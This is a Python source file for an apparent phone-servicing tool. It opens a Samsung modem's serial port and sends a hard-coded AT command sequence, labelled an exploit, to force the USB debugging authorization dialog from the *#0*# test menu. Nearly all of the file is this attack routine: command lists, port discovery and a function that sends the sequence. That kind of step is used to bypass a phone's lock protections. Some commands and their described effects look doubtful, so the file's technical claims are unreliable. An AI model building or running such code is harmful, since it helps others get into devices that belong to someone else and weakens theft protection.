"""
Android Multi-Tool Pro - Samsung Modem AT Command Exploit Engine
Communicates over virtual COM ports to trigger the USB Debugging authorization
dialog directly from the Samsung *#0*# Emergency Test menu.
"""


from typing import List, Tuple

try:
    import serial
except Exception:
    serial = None

class SamsungModemEngine:
    """
    Handles serial AT commands sent to Samsung Mobile USB Modem COM port.
    """
    MODEM_INIT_COMMANDS = [
        "AT\r\n",
        "ATE0\r\n",
        "AT+DEVCONINFO\r\n"
    ]

    # The famous test mode exploit command sequence
    TEST_MODE_ENABLE_ADB = [
        "AT+KNTD=00000000\r\n",
        "AT+SWAT=1\r\n",
        "AT+ACTIVATE=0,0,0\r\n"
    ]

    def build_test_mode_sequence(self) -> list[tuple[str, str]]:
        """Returns sequence of commands with descriptions."""
        return [
            ("AT", "Ping Modem Interface"),
            ("AT+DEVCONINFO", "Read device hardware and firmware version"),
            ("AT+KNTD=00000000", "Inject Test Mode Debugger Switch"),
            ("AT+SWAT=1", "Enable System Watchdog & ADB listener"),
            ("AT+ACTIVATE=0,0,0", "Force display of 'Allow USB Debugging' dialog")
        ]

    def format_dial_command(self, dial_code: str) -> str:
        """Sends AT command simulating keypresses on the dialer keypad."""
        clean = dial_code.replace("#", "%23")
        return f"ATD{clean};\r\n"

    # ------------------------------------------------------------------
    # Real serial-port AT channel (pyserial)
    # ------------------------------------------------------------------
    def find_modem_port(self):
        """Locate a Samsung modem serial port on the host."""
        try:
            from .serial_ports import list_serial_ports, classify_port
            for p in list_serial_ports():
                if classify_port(p) == "SAMSUNG":
                    return p
        except Exception:
            pass
        return None

    def send_at_sequence(self, commands=None, port=None, timeout=2.0, baudrate=115200) -> Tuple[bool, List[str]]:
        """Open the Samsung modem COM port and send AT commands, returning logs.

        This is the real '#*0*#' Test-Mode channel. Honest result: returns
        (False, logs) if pyserial is missing or no modem port is present.
        """
        if serial is None:
            return False, ["pyserial is not installed — run the tool's 'Install Tools & Drivers'."]

        if not port:
            found = self.find_modem_port()
            if not found:
                return False, ["No Samsung modem COM/tty port detected (is the phone in *#0*# test mode?)."]
            port = found.get("port")
            logs = [f"Using Samsung modem port: {port} ({found.get('description','')})"]
        else:
            logs = [f"Using modem port: {port}"]

        seq = commands or (self.MODEM_INIT_COMMANDS + self.TEST_MODE_ENABLE_ADB)
        try:
            ser = serial.Serial(port, baudrate, timeout=timeout)
            for cmd in seq:
                ser.write(cmd.encode("ascii", "ignore"))
                import time
                time.sleep(0.25)
                resp = ser.read(256).decode("ascii", "ignore").replace("\r", " ").replace("\n", " ").strip()
                logs.append(f"{cmd.strip()} -> {resp or '(no response)'}")
            ser.close()
            return True, logs
        except Exception as e:
            return False, logs + [f"AT sequence failed on {port}: {e}"]
